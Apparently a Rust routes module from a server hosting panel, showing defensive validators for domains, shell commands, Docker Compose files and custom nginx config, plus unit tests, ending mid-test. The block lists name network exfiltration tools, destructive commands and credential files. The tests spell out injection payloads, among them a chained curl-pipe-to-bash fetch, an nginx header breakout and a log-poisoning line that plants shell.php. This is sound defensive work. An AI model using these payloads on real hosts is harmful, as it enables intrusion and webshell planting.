pub mod activity;
pub mod agent_checkin;
pub mod alerts;
pub mod agent_updates;
pub mod api_keys;
pub mod auth;
pub mod backup_destinations;
pub mod backup_orchestrator;
pub mod backup_schedules;
pub mod backups;
pub mod branding_assets;
pub mod cdn;
pub mod dashboard;
pub mod oauth;
pub mod billing;
pub mod crons;
pub mod databases;
pub mod deploy;
pub mod dns;
pub mod docker_apps;
pub mod extensions;
pub mod files;
pub mod incidents;
pub mod git_deploys;
pub mod logs;
pub mod mail;
pub mod metrics;
pub mod monitors;
pub mod notifications;
pub mod on_call;
pub mod escalation_policies;
pub mod drift;
pub mod security;
pub mod security_scans;
pub mod servers;
pub mod settings;
pub mod stacks;
pub mod staging;
pub mod sites;
pub mod system_logs;
pub mod teams;
pub mod tls_certificates;
pub mod ssl;
pub mod system;
pub mod terminal;
pub mod users;
pub mod reseller_dashboard;
pub mod migration;
pub mod resellers;
pub mod secrets;
pub mod iac;
pub mod image_scans;
pub mod sboms;
pub mod passkeys;
pub mod prometheus;
pub mod webhook_gateway;
pub mod telemetry;
pub mod update;
pub mod whmcs;
pub mod wordpress;
pub mod ws_metrics;

use axum::{
    http::HeaderMap,
    routing::{delete, get, post, put},
    Router,
};

use crate::AppState;

/// GAP 46: Extract client IP from request headers.
/// Prefers x-real-ip (set by trusted reverse proxy), falls back to x-forwarded-for.
pub fn client_ip(headers: &HeaderMap) -> Option<String> {
    headers.get("x-real-ip")
        .or_else(|| headers.get("x-forwarded-for"))
        .and_then(|v| v.to_str().ok())
        .map(|s| s.split(',').next().unwrap_or(s).trim().to_string())
}

/// Failed webhook-secret attempts tolerated per deploy id before the route
/// starts refusing, inside the one-hour window both webhook handlers roll.
///
/// It lives here because it has THREE readers that must agree: the git-deploy
/// webhook, the site-deploy webhook, and the cleanup task in `main.rs`, which
/// sheds zero-count entries above its cap and therefore has to know what a
/// count "at the limit" is. They disagreed once already — the janitor evicted
/// on a five-minute window while both handlers promised an hour — and a literal
/// repeated in three files is how that happens.
pub const WEBHOOK_ATTEMPT_LIMIT: u32 = 10;

/// Validate a domain name format.
pub fn is_valid_domain(domain: &str) -> bool {
    if domain.is_empty() || domain.len() > 253 {
        return false;
    }
    domain.split('.').all(|part| {
        !part.is_empty()
            && part.len() <= 63
            && part
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '-')
            && !part.starts_with('-')
            && !part.ends_with('-')
    }) && domain.contains('.')
}

/// Reserved control-plane domains that a tenant must never be able to claim,
/// alias onto, clone onto, or rename onto. Factored out so every
/// domain-introducing path (create / clone / rename / add_alias) shares ONE
/// guard and cannot drift.
///
/// The list is derived from THIS install, not from the vendor. Until v2.31.0 it
/// was the hardcoded triple `["dockpanel.dev","panel.example.com",
/// "docs.dockpanel.dev"]` — our own marketing domains plus a documentation
/// placeholder, compiled into every customer's build, where they protect
/// nothing and merely refuse three arbitrary names (s252 F9).
///
/// What actually needs protecting is the host the panel itself is served on:
/// that is the vhost a tenant site would collide with, letting them take over
/// the panel's `server_name` and phish the admin login (the s241 squat).
///
/// **Exact host only, deliberately.** The panel session cookie is host-scoped
/// (no `Domain=` attribute — see `auth::cookie_secure_flag`'s neighbours), so a
/// subdomain cannot read it and does not collide with the panel's server_name.
/// Reserving subdomains here would instead break the ordinary case of a panel
/// at an apex: an operator running the panel on `example.com` must still be
/// able to host `blog.example.com`.
///
/// `RESERVED_DOMAINS` (comma-separated) lets an operator reserve additional
/// zones; those DO match subdomains, because naming a zone means the zone.
pub fn is_reserved_domain(domain: &str) -> bool {
    static RESERVED: std::sync::OnceLock<(Option<String>, Vec<String>)> = std::sync::OnceLock::new();
    let (panel_host, zones) = RESERVED.get_or_init(|| {
        let panel_host = panel_host_from_base_url(&std::env::var("BASE_URL").unwrap_or_default());
        let zones = std::env::var("RESERVED_DOMAINS")
            .unwrap_or_default()
            .split(',')
            .map(|s| s.trim().to_lowercase())
            .filter(|s| !s.is_empty())
            .collect();
        (panel_host, zones)
    });

    reserved_match(domain, panel_host.as_deref(), zones)
}

/// Extract the bare host from `BASE_URL` as setup.sh writes it
/// (`https://panel.example.com`, or empty on a domainless install). Only the
/// host is read — never the scheme, which does not describe how the vhost is
/// actually served (see the warning above `auth::cookie_secure_flag`).
fn panel_host_from_base_url(base: &str) -> Option<String> {
    let b = base.trim().to_lowercase();
    let hostport = b
        .strip_prefix("https://")
        .or_else(|| b.strip_prefix("http://"))
        .unwrap_or(&b);
    let host = hostport.split('/').next().unwrap_or("");
    // Strip a :port, but never mangle a bare IPv6 literal.
    let host = if host.starts_with('[') {
        host.split(']').next().unwrap_or("").trim_start_matches('[')
    } else {
        host.split(':').next().unwrap_or("")
    };
    (!host.is_empty()).then(|| host.to_string())
}

/// [`is_reserved_domain`] plus the host THIS request arrived on.
///
/// **`BASE_URL` is not a reliable statement of the panel's hostname.** It is
/// routinely empty on a box whose panel nginx serves a real domain — observed on
/// demo.dockpanel.dev and on a fresh install, because `setup.sh` only writes it
/// when `PANEL_DOMAIN` was supplied. s256 shipped a guard that trusted it alone,
/// and on the demo box that made this check inert: creating a site for the
/// panel's own domain wrote a vhost that took over its `server_name`, and the
/// panel started answering 404. That is exactly the squat s241 closed.
///
/// The `Host` header is always right, because it is the address the operator is
/// driving the panel on at this very moment. It is attacker-controlled in
/// general, which is fine here: it can only ever reserve MORE, never less, so
/// forging it costs the forger a domain they cannot register anyway.
///
/// Use this on every path that introduces a domain and can see request headers;
/// [`is_reserved_domain`] remains for the paths that cannot.
pub fn is_reserved_domain_for(domain: &str, headers: &HeaderMap) -> bool {
    if is_reserved_domain(domain) {
        return true;
    }
    let Some(host) = headers
        .get(axum::http::header::HOST)
        .and_then(|v| v.to_str().ok())
    else {
        return false;
    };
    // Reuse the BASE_URL parser: it strips an optional scheme, a path and a
    // port, and lowercases — a bare `demo.example.com:8443` is exactly that
    // shape minus the scheme.
    match panel_host_from_base_url(host) {
        Some(h) => reserved_match(domain, Some(&h), &[]),
        None => false,
    }
}

/// The pure decision, split out so it is testable without touching process env
/// (a `OnceLock` initialised from env can only ever be observed once per test
/// binary, so the branches below would otherwise be unreachable from a test).
fn reserved_match(domain: &str, panel_host: Option<&str>, zones: &[String]) -> bool {
    let d = domain.trim().to_lowercase();
    if panel_host.is_some_and(|h| h == d) {
        return true;
    }
    zones
        .iter()
        .any(|r| d == *r || d.ends_with(&format!(".{r}")))
}

/// Validate a value destined for an nginx `add_header Name "<value>" always;`
/// directive (CSP / Permissions-Policy). The value is rendered verbatim inside a
/// double-quoted argument in a `.conf` template, and Tera does NOT autoescape
/// `.conf`, so an unescaped `"` (or a trailing `\`) closes the quoted string
/// early and lets the remainder inject arbitrary nginx directives. `;` is
/// intentionally allowed — a real CSP uses it as a directive separator and it is
/// inert inside the quotes.
pub fn is_safe_header_value(v: &str) -> bool {
    !v.contains('"')
        && !v.contains('\\')
        && !v.contains('\n')
        && !v.contains('\r')
        && !v.contains('\0')
        && !v.contains('{')
        && !v.contains('}')
}

/// Validate a resource name (database, app, etc.).
pub fn is_valid_name(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 64
        && name
            .chars()
            .next()
            .is_some_and(|c| c.is_ascii_alphanumeric())
        && name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
}

/// Validate a Docker container ID (hex string, 1–64 chars).
pub fn is_valid_container_id(id: &str) -> bool {
    !id.is_empty()
        && id.len() <= 64
        && id.chars().all(|c| c.is_ascii_hexdigit())
}

/// Validate a user-provided file path (reject traversal and injection).
pub fn is_safe_relative_path(path: &str) -> bool {
    !path.is_empty()
        && !path.contains('\0')
        && !path.contains("..")
        && !path.starts_with('/')
        && !path.contains('\\')
        && path.len() <= 4096
}

/// Validate a shell command string for safety (used for cron, pre_build, post_deploy).
/// Rejects dangerous shell metacharacters and patterns while allowing legitimate commands.
pub fn is_safe_shell_command(cmd: &str) -> Result<(), &'static str> {
    if cmd.trim().is_empty() {
        return Err("Command cannot be empty");
    }
    if cmd.len() > 4096 {
        return Err("Command too long (max 4096 chars)");
    }
    if cmd.contains('\0') {
        return Err("Command must not contain null bytes");
    }
    if cmd.contains('\n') || cmd.contains('\r') {
        return Err("Command must not contain newlines");
    }

    // A bare `;` always chains regardless of exit status; a bare (unpaired)
    // `|` chains just as effectively — neither is caught by the verb-anchored
    // patterns below (";bash", "| sh", ...), which never matched "id;whoami"
    // or "id|whoami" (no space, no shell name). `&&`/`||` remain allowed for
    // legitimate multi-step commands (e.g. "migrate && cache:clear"): only a
    // run of `|` whose length isn't exactly 2 is rejected.
    if cmd.contains(';') {
        return Err("Command must not contain a bare ; (use && or || to chain)");
    }
    {
        let bytes = cmd.as_bytes();
        let mut i = 0;
        while i < bytes.len() {
            if bytes[i] == b'|' {
                let start = i;
                while i < bytes.len() && bytes[i] == b'|' {
                    i += 1;
                }
                if i - start != 2 {
                    return Err("Command must not contain a bare | (use || to chain)");
                }
            } else {
                i += 1;
            }
        }
    }

    let lower = cmd.to_lowercase();

    // Block injection patterns
    let dangerous = [
        "`", "$(", "<(", "<<", "eval ", "exec ",
        "|sh", "|bash", "| sh", "| bash",
        ";sh", ";bash", "; sh", "; bash",
        "/bin/sh", "/bin/bash",
    ];
    for d in &dangerous {
        if lower.contains(d) {
            return Err("Command contains dangerous shell injection pattern");
        }
    }

    // Block encoding/decoding bypass tools
    let encoding = [
        "base64", "xxd", "openssl enc", "printf '\\x",
    ];
    for e in &encoding {
        if lower.contains(e) {
            return Err("Command contains encoding bypass tool");
        }
    }

    // Block scripting interpreters that can execute arbitrary code
    let interpreters = [
        "python -c", "python2 -c", "python3 -c",
        "perl -e", "perl -E", "ruby -e",
        "node -e", "php -r",
        "python -m http", "python3 -m http",
    ];
    for i in &interpreters {
        if lower.contains(i) {
            return Err("Command contains scripting interpreter with inline code");
        }
    }

    // Block network tools
    let network = [
        "curl ", "wget ", "nc ", "ncat ", "socat ", "telnet ",
    ];
    for n in &network {
        if lower.contains(n) {
            return Err("Command contains network exfiltration tool");
        }
    }

    // Block system destruction
    let destructive = [
        "rm -rf /", "rm -rf /*", "mkfs", "dd if=", "> /dev/",
        "chmod 777 /", "shutdown", "reboot", "init 0", "init 6",
    ];
    for d in &destructive {
        if lower.contains(d) {
            return Err("Command contains destructive operation");
        }
    }

    // Block privilege escalation
    let escalation = [
        "useradd", "userdel", "usermod", "adduser", "chpasswd",
        "passwd", "/etc/shadow", "/etc/sudoers",
        "visudo", "chown root", "chmod +s", "chmod 4",
    ];
    for e in &escalation {
        if lower.contains(e) {
            return Err("Command contains privilege escalation attempt");
        }
    }

    Ok(())
}

/// Every image reference a Compose document would run, in declaration order.
///
/// Read here rather than from the agent's `/apps/compose/parse` so the deploy
/// gate can refuse before anything is claimed, created or sent to a host — and
/// so a compose door pays no round trip when the gate is switched off. Parsed
/// the same way [`validate_compose_yaml`] parses it, for the same reason: a
/// string scan is bypassable with anchors, aliases and alternate quoting.
///
/// A service built from a `build:` context has no image reference to check and
/// is skipped; it is not a registry image and no scan can exist for it.
pub fn compose_images(yaml: &str) -> Vec<String> {
    let Ok(doc) = serde_yaml_ng::from_str::<serde_yaml_ng::Value>(yaml) else {
        return Vec::new();
    };
    let Some(services) = doc.get("services").and_then(|s| s.as_mapping()) else {
        return Vec::new();
    };
    services
        .iter()
        .filter_map(|(_, svc)| svc.get("image").and_then(|v| v.as_str()))
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect()
}

/// The services the agent will SILENTLY DROP — those naming no image.
///
/// The compose engine deserialises each service into a struct whose `image` is
/// an `Option<String>` and skips the service outright when it is `None`. That
/// service never becomes a container, so the deploy comes up missing exactly
/// the part the author cared about while every status the panel writes says the
/// deploy succeeded. Naming them lets a door refuse instead.
///
/// ⚠ The predicate has to be the AGENT'S question, not a similar one. The agent
/// reads a typed `Option<String>`; this side reads an untyped YAML value, and
/// the two disagree about YAML null. `image:` written with no value — the
/// ordinary way an author blanks the line while switching a service over to
/// `build:` — is `Some(Value::Null)` here and `None` there, so a predicate
/// spelled `.get("image").is_none()` reports nothing while the agent drops the
/// service. Measured over `image:`, `image: ~`, `image: ""`, `image: "   "`, a
/// missing key and a fully-populated file; only the arm below agrees with the
/// agent on all six.
///
/// The empty-string spellings are deliberately NOT included: the agent does not
/// skip those, it tries to create a container from them, so refusing here would
/// refuse a file the agent still deploys.
pub fn compose_services_without_image(yaml: &str) -> Vec<String> {
    let Ok(doc) = serde_yaml_ng::from_str::<serde_yaml_ng::Value>(yaml) else {
        return Vec::new();
    };
    let Some(services) = doc.get("services").and_then(|s| s.as_mapping()) else {
        return Vec::new();
    };
    services
        .iter()
        .filter(|(_, svc)| matches!(svc.get("image"), None | Some(serde_yaml_ng::Value::Null)))
        .filter_map(|(name, _)| name.as_str().map(str::to_string))
        .collect()
}

/// Validate a Docker Compose YAML for dangerous directives.
/// Parses the YAML into a structured format to prevent bypass via anchors, aliases, or alternate quoting.
pub fn validate_compose_yaml(yaml: &str) -> Result<(), &'static str> {
    let doc: serde_yaml_ng::Value = serde_yaml_ng::from_str(yaml)
        .map_err(|_| "Invalid YAML syntax")?;

    // Check each service definition
    if let Some(services) = doc.get("services").and_then(|s| s.as_mapping()) {
        for (_name, svc) in services {
            // Block privileged mode
            if let Some(p) = svc.get("privileged") {
                if p.as_bool() == Some(true) {
                    return Err("Compose: privileged mode is not allowed");
                }
            }

            // Block dangerous network/pid/ipc modes
            for key in &["network_mode", "pid", "ipc"] {
                if let Some(v) = svc.get(*key).and_then(|v| v.as_str()) {
                    if v == "host" {
                        return Err("Compose: host namespace sharing is not allowed");
                    }
                }
            }

            // Block dangerous capabilities
            if let Some(caps) = svc.get("cap_add").and_then(|c| c.as_sequence()) {
                let dangerous_caps = ["SYS_ADMIN", "SYS_PTRACE", "NET_ADMIN", "ALL",
                                      "NET_RAW", "SYS_RAWIO", "SYS_MODULE", "DAC_OVERRIDE"];
                for cap in caps {
                    if let Some(s) = cap.as_str() {
                        let upper = s.to_uppercase();
                        if dangerous_caps.contains(&upper.as_str()) {
                            return Err("Compose: dangerous capability not allowed");
                        }
                    }
                }
            }

            // Block dangerous volume mounts (both short-form string and long-form object syntax)
            if let Some(vols) = svc.get("volumes").and_then(|v| v.as_sequence()) {
                for vol in vols {
                    // Get the source path from either short-form ("host:container") or long-form ({source: "host"})
                    let source = if let Some(s) = vol.as_str() {
                        s.to_string()
                    } else if let Some(m) = vol.as_mapping() {
                        m.get(&serde_yaml_ng::Value::String("source".into()))
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .to_string()
                    } else {
                        String::new()
                    };

                    if source.contains("docker.sock") || source.contains("/var/run/docker") {
                        return Err("Compose: Docker socket mount is not allowed");
                    }
                    // Block host root mounts
                    if source.starts_with("/:/") || source.starts_with("/:") || source == "/" {
                        return Err("Compose: mounting host root is not allowed");
                    }
                    // Block sensitive host paths
                    let sensitive = ["/etc/shadow", "/etc/passwd", "/etc/sudoers", "/root/", "/home/"];
                    for s in &sensitive {
                        if source.starts_with(s) || source.contains(&format!(":{s}")) {
                            return Err("Compose: sensitive host path mount is not allowed");
                        }
                    }
                }
            }

            // Block dangerous security_opt
            if let Some(opts) = svc.get("security_opt").and_then(|s| s.as_sequence()) {
                for opt in opts {
                    if let Some(s) = opt.as_str() {
                        let lower = s.to_lowercase();
                        if lower.contains("unconfined") {
                            return Err("Compose: disabling security profiles is not allowed");
                        }
                    }
                }
            }

            // Block devices (host device passthrough)
            if svc.get("devices").is_some() {
                return Err("Compose: host device passthrough is not allowed");
            }
        }
    }

    Ok(())
}

/// Validate custom nginx config blocks.
pub fn is_safe_nginx_config(config: &str) -> Result<(), &'static str> {
    if config.len() > 10240 {
        return Err("Custom nginx directives must be under 10KB");
    }
    if config.contains('\0') {
        return Err("Config contains null bytes");
    }

    let lower = config.to_lowercase();

    let dangerous = [
        "lua_", "content_by_lua", "access_by_lua", "rewrite_by_lua",
        "set_by_lua", "header_filter_by_lua", "body_filter_by_lua",
        "proxy_pass http://127.0.0.1", "proxy_pass http://localhost",
        "proxy_pass http://0.0.0.0", "proxy_pass http://[::1]",
        "proxy_pass http://169.254",  // AWS metadata
        "proxy_pass http://metadata",
        "load_module", "include /etc/", "include /root/",
        "ssl_certificate /etc/shadow",
        "alias /etc/", "alias /root/", "alias /home/",
        "root /etc/", "root /root/", "root /home/",
        // File-writing directives: an attacker chained one past the agent's
        // per-line whitelist via ';' (e.g. "sendfile on; access_log
        // /var/www/victim/public/shell.php;") to poison a log into another
        // tenant's webroot. A substring match catches it regardless of position;
        // the agent's per-statement allowlist (services/nginx.rs) is the
        // authoritative gate.
        "access_log", "error_log",
    ];
    for d in &dangerous {
        if lower.contains(d) {
            return Err("Custom nginx config contains dangerous directive");
        }
    }

    // Directives the site template already writes at SERVER level, into the same
    // `server { … }` block this text is injected into. nginx refuses a duplicate
    // outright, so accepting one produced a configuration it rejects — and the
    // agent's copy of this check runs inside the template RENDER, whose failure
    // reaches the operator as `Operation failed. Reference: <uuid>` (agent_error
    // hands a sentence through only on 4xx). Refused here so the reason survives
    // the trip: this path answers 400 and `err(…)` carries the text.
    //
    // Three names, derived rather than guessed: `add_header` and `gzip_types` are
    // emitted there too and legitimately repeat, and `expires` is emitted only
    // inside `location` blocks, which is a different context.
    for stmt in config.split(';') {
        let directive = stmt
            .trim()
            .split(|c: char| c.is_whitespace())
            .next()
            .unwrap_or("")
            .to_lowercase();
        match directive.as_str() {
            "client_max_body_size" => {
                return Err(
                    "The site already sets 'client_max_body_size' — nginx refuses a \
                            duplicate and the whole site would fail to load. Change the site's \
                            maximum upload size instead; that is the control that writes it.",
                );
            }
            "gzip" | "gzip_min_length" => {
                return Err(
                    "The site already enables gzip — nginx refuses a duplicate 'gzip' or \
                            'gzip_min_length' and the whole site would fail to load. Compression \
                            is on for every site already.",
                );
            }
            _ => {}
        }
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── is_safe_shell_command (cron / pre_build_cmd / post_deploy_cmd save-time gate) ──

    /// `dockpanel-fanout` s429: a bare `;`/`|` (no trailing space, no "sh"/
    /// "bash" suffix) passed straight through the old verb-anchored dangerous
    /// list — `is_safe_shell_command("id;whoami")` returned `Ok(())`. This is
    /// the SAME gap as the agent-side `is_safe_cron_command` fix (both share
    /// the identical bypass shape), on the save-time side used by cron,
    /// pre_build_cmd, and post_deploy_cmd. `&&`/`||` must keep working.
    #[test]
    fn shell_command_rejects_bare_chain_operators_keeps_paired_operators() {
        assert!(is_safe_shell_command("id;whoami").is_err());
        assert!(is_safe_shell_command("id|whoami").is_err());
        assert!(is_safe_shell_command("id ;whoami").is_err());
        assert!(is_safe_shell_command("id; whoami").is_err());
        assert!(is_safe_shell_command("legit-command;curl http://x/y|bash").is_err());
        assert!(is_safe_shell_command("a|||b").is_err());
        assert!(is_safe_shell_command("php artisan migrate && php artisan cache:clear").is_ok());
        assert!(is_safe_shell_command("backup.sh || notify-fail.sh").is_ok());
        assert!(is_safe_shell_command("npm install").is_ok());
    }

    // ── Compose image extraction (the deploy gate's input) ──────────────

    #[test]
    fn compose_images_reads_every_service() {
        let yaml =
            "services:\n  web:\n    image: nginx:1.27\n  db:\n    image: postgres:16-alpine\n";
        let mut got = compose_images(yaml);
        got.sort();
        assert_eq!(
            got,
            vec!["nginx:1.27".to_string(), "postgres:16-alpine".to_string()]
        );
    }

    #[test]
    fn compose_images_survives_the_shapes_that_are_not_images() {
        // A build-only service has no reference to gate on.
        assert!(compose_images("services:\n  app:\n    build: .\n").is_empty());
        // Malformed input is not a licence to deploy ungated — but it is also
        // not this function's error to raise: validate_compose_yaml refuses it
        // first, and every caller runs that.
        assert!(compose_images("{{{").is_empty());
        assert!(compose_images("version: '3'\n").is_empty());
        // A whole-node alias DOES resolve, which is the reason this parses
        // rather than greps — a string scan would see one image here.
        let aliased = "services:\n  a: &base\n    image: redis:7\n  b: *base\n";
        assert_eq!(compose_images(aliased).len(), 2);

        // A `<<:` MERGE key does not, and that is safe rather than a bypass:
        // the agent deserialises the same document with the same crate, so a
        // service whose image arrives only through a merge key has no image on
        // the agent's side either and never runs. The extractor and the thing
        // it guards agree by construction — which is the property that matters,
        // not whether either of them implements merge keys.
        let merged = "services:\n  a: &base\n    image: redis:7\n  b:\n    <<: *base\n";
        assert_eq!(compose_images(merged).len(), 1);
    }

    // ── The services the agent silently drops ───────────────────────────

    #[test]
    fn services_without_an_image_are_named() {
        let yaml = "services:\n  web:\n    build: .\n  db:\n    image: postgres:16\n";
        assert_eq!(
            compose_services_without_image(yaml),
            vec!["web".to_string()]
        );
        // Nothing to refuse when every service names an image.
        let ok = "services:\n  web:\n    image: nginx\n  db:\n    image: postgres:16\n";
        assert!(compose_services_without_image(ok).is_empty());
    }

    #[test]
    fn a_blanked_image_line_is_the_same_defect_and_must_be_named_too() {
        // ⚠ This is the case that decides the predicate, and it is the one an
        // author actually writes: `image:` left with no value while switching a
        // service to `build:`. Here that is `Some(Value::Null)`; on the agent it
        // deserialises to `None` and the service is dropped. A predicate spelled
        // `.get("image").is_none()` returns nothing for all three spellings
        // below while the agent drops the service — the refusal would be green
        // from birth against the ordinary spelling of the thing it refuses.
        for yaml in [
            "services:\n  web:\n    image:\n    build: .\n  db:\n    image: postgres:16\n",
            "services:\n  web:\n    image: ~\n  db:\n    image: postgres:16\n",
            "services:\n  web:\n    image: null\n  db:\n    image: postgres:16\n",
        ] {
            assert_eq!(
                compose_services_without_image(yaml),
                vec!["web".to_string()],
                "a null image must be reported: {yaml}"
            );
        }
    }

    #[test]
    fn an_empty_image_string_is_not_reported_because_the_agent_does_not_drop_it() {
        // The agent deserialises `""` to `Some("")` and tries to create a
        // container from it, so refusing here would refuse a file the agent
        // still deploys. The two sides have to answer the SAME question, not
        // two similar ones.
        for yaml in [
            "services:\n  web:\n    image: \"\"\n  db:\n    image: postgres:16\n",
            "services:\n  web:\n    image: \"   \"\n  db:\n    image: postgres:16\n",
        ] {
            assert!(
                compose_services_without_image(yaml).is_empty(),
                "an empty image string is not the dropped-service defect: {yaml}"
            );
        }
    }

    // ── Reserved (control-plane) domains — s241 H2/H3 ───────────────────

    #[test]
    fn reserved_domains_rejected() {
        let panel = Some("panel.example.com");
        let none: &[String] = &[];

        // The squat s241 closed: a tenant claiming the panel's own vhost.
        assert!(reserved_match("panel.example.com", panel, none));
        assert!(reserved_match("PANEL.EXAMPLE.COM", panel, none)); // case-insensitive
        assert!(reserved_match("  panel.example.com  ", panel, none)); // trimmed

        // Legitimate tenant domains are allowed.
        assert!(!reserved_match("example.com", panel, none));
        assert!(!reserved_match("panel.example.com.evil.com", panel, none)); // not a suffix match
        assert!(!reserved_match("notpanel.example.com", panel, none));

        // Exact host only: an operator whose panel is at the apex must still be
        // able to host ordinary subdomains. The session cookie is host-scoped,
        // so a subdomain neither collides nor inherits the session.
        let apex = Some("example.com");
        assert!(reserved_match("example.com", apex, none));
        assert!(!reserved_match("blog.example.com", apex, none));

        // A domainless install (BASE_URL empty) reserves nothing — the panel is
        // on its own port, so no site vhost can collide with it.
        assert!(!reserved_match("anything.example.com", None, none));

        // Operator-declared zones DO match subdomains: naming a zone means the zone.
        let zones = vec!["internal.corp".to_string()];
        assert!(reserved_match("internal.corp", None, &zones));
        assert!(reserved_match("vpn.internal.corp", None, &zones));
        assert!(!reserved_match("internal.corp.evil.com", None, &zones));
        assert!(!reserved_match("notinternal.corp", None, &zones));
    }

    /// The regression that shipped in v2.31.0 and took demo.dockpanel.dev down.
    ///
    /// `BASE_URL` is empty on a box whose panel nginx serves a real domain, so a
    /// guard that trusts it alone reserves nothing and a tenant can claim the
    /// panel's own `server_name`. The request's Host is the signal that is
    /// always right. (Env is empty in the test binary, so `is_reserved_domain`
    /// contributes nothing here and this isolates the Host behaviour.)
    #[test]
    fn the_host_the_panel_is_being_driven_on_is_reserved() {
        let host_hdr = |v: &str| {
            let mut h = HeaderMap::new();
            h.insert(axum::http::header::HOST, v.parse().unwrap());
            h
        };

        // The exact case: the operator is on the panel's own host and tries to
        // create a site for it. Before the fix this returned false and the new
        // vhost took over the panel's server_name, and the panel answered 404.
        let h = host_hdr("panel.example.com");
        assert!(is_reserved_domain_for("panel.example.com", &h));
        assert!(is_reserved_domain_for("PANEL.EXAMPLE.COM", &h));

        // A Host carrying a port (the domainless install, panel on :8443).
        let h_port = host_hdr("192.168.1.50:8443");
        assert!(is_reserved_domain_for("192.168.1.50", &h_port));

        // Exact host only — subdomains of the panel host stay available, and
        // unrelated domains are unaffected.
        assert!(!is_reserved_domain_for("blog.panel.example.com", &h));
        assert!(!is_reserved_domain_for("example.com", &h));
        assert!(!is_reserved_domain_for("notpanel.example.com", &h));

        // No Host header at all must not panic and must not reserve anything.
        assert!(!is_reserved_domain_for("example.com", &HeaderMap::new()));
    }

    #[test]
    fn panel_host_parsed_from_every_base_url_shape() {
        // The shapes setup.sh and the settings UI actually produce.
        assert_eq!(
            panel_host_from_base_url("https://panel.example.com").as_deref(),
            Some("panel.example.com")
        );
        assert_eq!(
            panel_host_from_base_url("http://192.168.1.1:8443").as_deref(),
            Some("192.168.1.1")
        );
        assert_eq!(
            panel_host_from_base_url("https://panel.example.com:8443/").as_deref(),
            Some("panel.example.com")
        );
        assert_eq!(
            panel_host_from_base_url("HTTPS://Panel.Example.COM").as_deref(),
            Some("panel.example.com")
        );
        assert_eq!(
            panel_host_from_base_url("https://[2001:db8::1]:8443").as_deref(),
            Some("2001:db8::1")
        );
        // A domainless install writes BASE_URL= (empty) — must yield no host,
        // NOT an empty string that would then match a trimmed empty domain.
        assert_eq!(panel_host_from_base_url(""), None);
        assert_eq!(panel_host_from_base_url("   "), None);
    }

    // ── add_header value validation — s241 C1 ───────────────────────────

    #[test]
    fn header_value_rejects_nginx_breakout() {
        // A real CSP (semicolons + single quotes) is accepted.
        assert!(is_safe_header_value("default-src 'self'; script-src 'self' https:"));
        assert!(is_safe_header_value("camera=(), microphone=(), geolocation=()"));
        // The break-out characters that close the quoted add_header argument are rejected.
        assert!(!is_safe_header_value("x\" always; location /pwn/ { alias /var/www/; }"));
        assert!(!is_safe_header_value("a\\")); // trailing backslash escapes the closing quote
        assert!(!is_safe_header_value("a\nb"));
        assert!(!is_safe_header_value("a{b}"));
    }

    // ── custom_nginx blocklist — s241 C2 (backend defense-in-depth) ─────

    #[test]
    fn nginx_config_blocks_chained_access_log() {
        // The ';'-chained log-poisoning payload must be rejected at the backend too.
        assert!(is_safe_nginx_config("sendfile on; access_log /var/www/victim/public/shell.php;").is_err());
        assert!(is_safe_nginx_config("gzip on; error_log /var/www/x/y.php;").is_err());
        // A benign directive still passes.
        assert!(is_safe_nginx_config("proxy_read_timeout 120s;").is_ok());
    }

    /// This asserted the OPPOSITE until v2.122.1 — that `client_max_body_size
    /// 20m;` is valid input — matching the agent-side test that made the same
    /// claim. The site template writes that directive at server level, into the
    /// same block this text lands in, so nginx refuses the result and the site
    /// stops loading. Refused HERE as well as in the agent, because only this
    /// path can hand the reason back to the operator: the agent's copy runs
    /// inside the template render and surfaces as a 502 with a reference.
    #[test]
    fn nginx_config_refuses_what_the_site_template_already_sets() {
        for stmt in [
            "client_max_body_size 20m;",
            "gzip on;",
            "gzip_min_length 512;",
            "  Client_Max_Body_Size 50m;",
            "proxy_read_timeout 60s; gzip off;",
        ] {
            let e = is_safe_nginx_config(stmt).expect_err(stmt);
            assert!(e.contains("already"), "{stmt} -> {e}");
        }
        // …and the ones that legitimately repeat are still accepted.
        assert!(is_safe_nginx_config("add_header X-Extra 1;").is_ok());
        assert!(is_safe_nginx_config("gzip_types application/wasm;").is_ok());
        assert!(is_safe_nginx_config("expires 1d;").is_ok());
    }

    // ── Domain validation ───────────────────────────────────────────────

    #[test]
    fn valid_domains() {
        assert!(is_valid_domain("example.com"));
        assert!(is_valid_domain("sub.example.com"));
        assert!(is_valid_domain("deep.sub.example.com"));
        assert!(is_valid_domain("my-site.example.com"));
        assert!(is_valid_domain("a.b"));
    }

    #[test]
    fn invalid_domains() {
        assert!(!is_valid_domain(""));
        assert!(!is_valid_domain("localhost")); // no dot
        assert!(!is_valid_domain(".example.com")); // starts with dot
        assert!(!is_valid_domain("example.com.")); // trailing dot (empty part)
        assert!(!is_valid_domain("-example.com")); // label starts with hyphen
        assert!(!is_valid_domain("example-.com")); // label ends with hyphen
        assert!(!is_valid_domain("exam ple.com")); // space
        assert!(!is_valid_domain("exam_ple.com")); // underscore
        assert!(!is_valid_domain(&"a".repeat(254))); // too long
    }

    #[test]
    fn domain_max_label_length() {
        let long_label = "a".repeat(63);
        assert!(is_valid_domain(&format!("{long_label}.com")));
        let too_long = "a".repeat(64);
        assert!(!is_valid_domain(&format!("{too_long}.com")));
    }

    // ── Name validation ─────────────────────────────────────────────────

    #[test]
    fn valid_names() {
        assert!(is_valid_name("mydb"));
        assert!(is_valid_name("my-app"));
        assert!(is_valid_name("my_app_123"));
        assert!(is_valid_name("a"));
        assert!(is_valid_name("A1"));
    }

    #[test]
    fn invalid_names() {
        assert!(!is_valid_name(""));
        assert!(!is_valid_name("-starts-with-dash"));
        assert!(!is_valid_name("_starts_with_underscore"));
        assert!(!is_valid_name("has space"));
        assert!(!is_valid_name("has.dot"));
        assert!(!is_valid_name("has/slash"));
        assert!(!is_valid_name(&"a".repeat(65))); // too long
    }

    // ── Container ID validation ─────────────────────────────────────────

    #[test]
    fn valid_container_ids() {
        assert!(is_valid_container_id("abc123"));
        assert!(is_valid_container_id("deadbeef"));
        assert!(is_valid_container_id(&"a".repeat(64)));
    }

    #[test]
    fn invalid_container_ids() {
        assert!(!is_valid_container_id(""));
        assert!(!is_valid_container_id("not-hex!"));
